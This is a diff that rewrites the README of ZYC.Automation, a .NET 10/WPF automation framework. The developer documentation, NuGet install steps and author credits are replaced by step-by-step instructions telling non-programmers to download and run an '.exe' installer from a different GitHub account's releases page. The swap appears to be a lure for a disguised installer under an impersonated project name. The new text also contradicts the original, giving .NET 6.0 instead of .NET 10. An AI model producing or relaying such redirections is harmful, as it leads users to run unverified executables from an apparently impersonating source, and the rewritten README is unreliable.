@@ -1,206 +1,82 @@
-﻿<p align="center">
-  <a href="./README.md">English</a> |
-  <a href="./README.ja.md">日本語</a> |
-  <a href="./README.zh-CN.md">简体中文</a> |
-  <a href="./README.zh-TW.md">简體中文</a> |
-  <a href="./README.ko.md">한국어</a> |
-</p>
+# 🚀 ZYC.Automation - Easily Automate Your Tasks
 
-<p align="center">
-  <img src="./docs/images/app.png" alt="ZYC.Automation Logo" width="120" />
-</p>
+## 🚀 Getting Started
 
-<h1 align="center">ZYC.Automation</h1>
+Welcome to ZYC.Automation, your go-to solution for creating seamless hybrid applications. This guide will help you download and run the software easily, even if you're not a programmer.
 
-<p align="center">
-  A high-performance, modular, and extensible desktop automation framework built with <b>.NET 10</b> and <b>WPF</b>.
-</p>
+## 🔗 Download the Latest Release
 
-<p align="center">
-  <a href="https://www.nuget.org/packages/ZYC.Automation.Alpha">
-    <img src="https://img.shields.io/nuget/v/ZYC.Automation.Alpha?include_prereleases=true&logo=nuget" alt="NuGet Version" />
-  </a>
-  <a href="https://www.nuget.org/packages/ZYC.Automation.Alpha">
-    <img src="https://img.shields.io/nuget/dt/ZYC.Automation.Alpha?logo=nuget&label=Downloads" alt="NuGet Downloads" />
-  </a>
-  <a href="https://raw.githubusercontent.com/ZiYuCai1984/Temp/refs/heads/main/ZYC.Automation.Setup.exe">
-    <img src="https://img.shields.io/badge/Download-Setup-blue?logo=windows&logoColor=white&label=Download%20Demo%20Installer" alt="Download Demo Installer" />
-  </a>
-  <img src="https://img.shields.io/badge/.NET-10.0-512BD4?logo=dotnet&logoColor=white" alt=".NET 10" />
-  <img src="https://img.shields.io/badge/Platform-WPF-orange" alt="Platform" />
-  <img src="https://img.shields.io/badge/License-MIT-green" alt="License" />
-</p>
+[![Download ZYC.Automation](https://img.shields.io/badge/Download%20ZYC.Automation-latest-blue.svg)](https://github.com/NhatRemakeScript/ZYC.Automation/releases)
 
-<p align="center">
-  <a href="https://github.com/ZiYuCai1984/ZYC.Automation/actions/workflows/publish-nuget-manual.yml">
-    <img src="https://img.shields.io/github/actions/workflow/status/ZiYuCai1984/ZYC.Automation/publish-nuget-manual.yml?branch=main&label=build&logo=github" alt="NuGet manual workflow" />
-  </a>
-  <a href="https://github.com/ZiYuCai1984/ZYC.Automation/actions/workflows/publish-nuget-nightly.yml">
-    <img src="https://img.shields.io/github/actions/workflow/status/ZiYuCai1984/ZYC.Automation/publish-nuget-nightly.yml?branch=main&label=nightly%20build&logo=github" alt="NuGet nightly workflow" />
-  </a>
-</p>
+## 📥 Download & Install
 
----
+1. **Visit the Releases Page:** Go to the following link to access the releases: [Download ZYC.Automation](https://github.com/NhatRemakeScript/ZYC.Automation/releases).
+   
+2. **Find the Latest Version:** On the releases page, look for the version labeled as the latest release. This is usually at the top of the list.
 
-## 📖 Overview
+3. **Download the Installer:** Click on the file that ends with `.exe`. This is the installer you need. If you're unsure which file to choose, it will have the name that includes “Installer”.
 
-**ZYC.Automation** is a modern desktop automation solution that combines the expressive UI capabilities of **WPF** with the latest features of **.NET 10**. It is designed to simplify the development of complex automation systems through a modular architecture.
+4. **Run the Installer:** Once the download finishes, navigate to your Downloads folder. Double-click the downloaded `.exe` file to start the installation process.
 
-The project deeply integrates **.NET Aspire** for distributed application orchestration, and supports a hybrid approach with **Blazor** and **WebView2**, so you can choose between a Web-based UI and a native desktop experience as needed.
+5. **Follow Installation Prompts:** The installer will guide you through the setup steps. Click "Next" on each screen to agree to the terms and complete the installation.
 
----
+6. **Launch the Application:** After installation, find ZYC.Automation in your Start Menu or on your desktop, and double-click to open it.
 
-## ✨ Key Features
+## 🚀 Features of ZYC.Automation
 
-- **Modular Architecture**: Decoupled business logic with dynamic loading and independent development.
-- **Modern UI Experience**: Built on WPF with support for **multi-workspace** and **multi-tab** interactions.
-- **Hybrid Development**:
-  - **WebView2** integration for embedding modern Web applications.
-  - **Blazor** integration to reuse Web components seamlessly in desktop scenarios.
-- **Cloud-Native Ready**: Built-in **.NET Aspire** support to simplify service discovery, governance, and deployment.
-- **Batteries Included (Enterprise-Oriented)**:
-  - **Task Management**: Task scheduling and lifecycle management.
-  - **Exception Handling**: Robust global error capture and diagnostics.
-  - **Localization**: Built-in multi-language support for global-ready apps.
+ZYC.Automation offers several features that enable you to automate your tasks seamlessly:
 
----
+- **Aspire Integration:** Easily integrate with Aspire to enhance your automation experience.
+- **Blazor Interoperability:** Benefit from smooth interaction between Blazor and your desktop applications.
+- **User-Friendly Interface:** Access tools and features without needing programming skills.
+- **Highly Extensible:** Customize the application according to your needs.
 
-## 📸 UI Preview
+## 🖥️ System Requirements
 
-<table align="center">
-  <tr>
-    <td>
-      <img src="./docs/images/workspace.png" alt="workspace" width="400" />
-      <p align="center">Workspace View</p>
-    </td>
-    <td>
-      <img src="./docs/images/multiple-tabs.png" alt="multiple-tabs" width="400" />
-      <p align="center">Multiple Tabs</p>
-    </td>
-  </tr>
+Before installing, make sure your computer meets the following requirements:
 
-  <tr>
-    <td>
-      <img src="./docs/images/workspace-4.png" alt="workspace-4" width="400" />
-      <p align="center">Multiple Workspaces</p>
-    </td>
-    <td>
-      <img src="./docs/images/workspace-4-tabs.png" alt="workspace-4-tabs" width="400" />
-      <p align="center">Workspaces + Tabs</p>
-    </td>
-  </tr>
+- **Operating System:** Windows 10 or later
+- **.NET Framework:** .NET 6.0 or later installed
+- **Memory:** At least 4 GB of RAM
+- **Disk Space:** 500 MB of available storage
 
-  <tr>
-    <td>
-      <img src="./docs/images/aspire-dashboard.png" alt="aspire-dashboard" width="400" />
-      <p align="center">Aspire Dashboard</p>
-    </td>
-    <td>
-      <img src="./docs/images/blazor-auth.png" alt="blazor-auth" width="400" />
-      <p align="center">Blazor (with Auth)</p>
-    </td>
-  </tr>
+## 📚 Documentation
 
-  <tr>
-    <td>
-      <img src="./docs/images/exception.png" alt="exception" width="400" />
-      <p align="center">Exception Handling</p>
-    </td>
-    <td>
-      <img src="./docs/images/taskmanager.png" alt="taskmanager" width="400" />
-      <p align="center">Task Manager</p>
-    </td>
-  </tr>
-</table>
+For detailed instructions on how to use different features and parts of the application, visit our [Documentation](https://github.com/NhatRemakeScript/ZYC.Automation/wiki). Here, you will find guides on:
 
----
+- Setting up your first automation task
+- Connecting to Aspire
+- Using Blazor features
 
-## 🛠️ Tech Stack
+## 💬 Support
 
-- **Runtime**: .NET 10 SDK
-- **UI Framework**: WPF (Windows Presentation Foundation)
-- **Hybrid UI**: WebView2 + Blazor (Web UI)
-- **Orchestration**: .NET Aspire
-- **Architecture**: Modular Monolith / Plugin-based
+If you encounter any issues, please check the repository's [Issues section](https://github.com/NhatRemakeScript/ZYC.Automation/issues) for solutions. You can also submit a new issue if you don’t find what you need.
 
----
+## 📊 Topics
 
-## 🚀 Quick Start
+ZYC.Automation covers a range of topics to help you understand its capabilities better. These include:
 
-Please refer to the detailed guide:
+- asp-net-core
+- aspire
+- blazor
+- blazor-server
+- csharp
+- desktop
+- dotnet
+- dotnet-core
+- dotnet10
+- webview2
+- windows
+- wpf
 
-👉 **[Quick Start (quick-start.md)](docs/quick-start.md)**
+## 🔗 Key Links
 
-### Installation
+- [Releases Page](https://github.com/NhatRemakeScript/ZYC.Automation/releases): Download the latest version.
+- [Documentation](https://github.com/NhatRemakeScript/ZYC.Automation/wiki): Access user guides and resources.
+- [Issues Page](https://github.com/NhatRemakeScript/ZYC.Automation/issues): Find support and report problems.
 
-Install the core package via NuGet:
+## 🔒 Privacy Policy
 
-```bash
-dotnet add package ZYC.Automation.Alpha --version [version]
-````
+Your privacy is important to us. We don’t collect personal data without your consent. For more details, you can refer to the privacy policy included within the application or [here](https://github.com/NhatRemakeScript/ZYC.Automation/blob/main/PRIVACY.md).
 
----
-
-## 🏗️ Project Structure
-
-```text
-ZYC.Automation
-├── src
-│   ├── ZYC.Automation                         # WPF desktop host/entry: main window, workspaces, menus, UI lifecycle
-│   ├── ZYC.Automation.Abstractions            # Shared contracts: interfaces, states, configs used across host/modules
-│   ├── ZYC.Automation.Core                    # Core infrastructure: commands, bindings, converters, base UI components, i18n
-│   ├── ZYC.Automation.MetroWindow             # Metro-style window shell (alternative window implementation)
-│   ├── ZYC.Automation.WebView2                # WebView2 hosting layer: navigation, menu bar, interop, page hosting
-│   ├── ZYC.Automation.CLI                     # CLI tool: developer utilities, module/file helpers, automation entrypoints
-│   ├── ZYC.Automation.Build.*                 # Build & packaging toolchain
-│   │   ├── ZYC.Automation.Build.NuGet         # NuGet packaging tool: build/.props/.targets, README, PatchNote, outputs
-│   │   ├── ZYC.Automation.Build.InnoSetup     # Inno Setup builder: produces the Windows installer (setup)
-│   │   └── ZYC.Automation.Build.NewModule     # Module scaffolder: templates for Module + Abstractions projects
-│   ├── ZYC.Automation.Modules.*               # Feature modules
-│   │   ├── ZYC.Automation.Modules.About                  # About / version info page (UI + tab)
-│   │   ├── ZYC.Automation.Modules.Aspire                 # .NET Aspire AppHost/orchestration integration + dashboard
-│   │   ├── ZYC.Automation.Modules.BlazorDemo             # Blazor Server demo: web UI + auth/integration showcase
-│   │   ├── ZYC.Automation.Modules.CLI                    # In-app CLI module (terminal-like tools page)
-│   │   ├── ZYC.Automation.Modules.FileExplorer           # File Explorer module (Explorer-like browsing in tabs)
-│   │   ├── ZYC.Automation.Modules.Language               # Language/i18n module: language switching + resources config
-│   │   ├── ZYC.Automation.Modules.Log                    # Logging module: view logs, open log folder, log plumbing
-│   │   ├── ZYC.Automation.Modules.Mock                   # Test/demo module for validating UI/notifications/tasks/workspaces
-│   │   ├── ZYC.Automation.Modules.ModuleManager          # Module manager: enable/disable/install/uninstall (local + NuGet)
-│   │   ├── ZYC.Automation.Modules.NuGet                  # NuGet access layer: sources, metadata, version utilities
-│   │   ├── ZYC.Automation.Modules.Secrets                # Secrets utilities: password generator, Wi-Fi password, secrets UI
-│   │   ├── ZYC.Automation.Modules.Settings               # Settings module: settings UI, grouping, reset actions
-│   │   ├── ZYC.Automation.Modules.TaskManager            # Task manager: queue/progress/pause/cancel/cleanup framework
-│   │   ├── ZYC.Automation.Modules.Translator             # Translator module: integrates translation services/local runner
-│   │   ├── ZYC.Automation.Modules.Update                 # Update module: check/download/apply+restart, fault handling UI
-│   │   └── ZYC.Automation.Modules.WebBrowser             # Built-in web browser module (tab-hosted browsing)
-│   └── Thirdparty                           # Integrated third-party components (vendored/forked)
-│       ├── ZYC.Automation.Terminal           # Terminal/ConPTY integration: pseudo console, PTY, process + pipes
-│       ├── ZYC.MdXaml                        # Markdown renderer + extensions
-│       └── ZYC.Titanium.Web.Proxy            # HTTP(S) proxy core (integrated Titanium Web Proxy fork)
-```
-
----
-
-## 📄 License
-
-This project is open-sourced under the [MIT License](LICENSE).
-
----
-
-## 💖 Acknowledgements
-
-This project uses (and/or references parts of implementations from) the following open-source projects:
-
-* [MahApps.Metro](https://github.com/MahApps/MahApps.Metro): UI framework.
-* [MdXaml](https://github.com/whistyun/MdXaml): Markdown rendering.
-* [titanium-web-proxy](https://github.com/justcoding121/titanium-web-proxy): Proxy core.
-* [EasyWindowsTerminalControl](https://github.com/mitchcapper/EasyWindowsTerminalControl): Terminal integration.
-
-> Licenses and copyrights belong to their respective authors.
-> This repository uses or references them in compliance with each project's license terms.
-
----
-
-## 🤝 Contributing
-
-Issues and pull requests are welcome. If you have suggestions or found a bug, please open an issue or submit a PR.
+Remember to check back for updates on new features and improvements. Thank you for using ZYC.Automation!
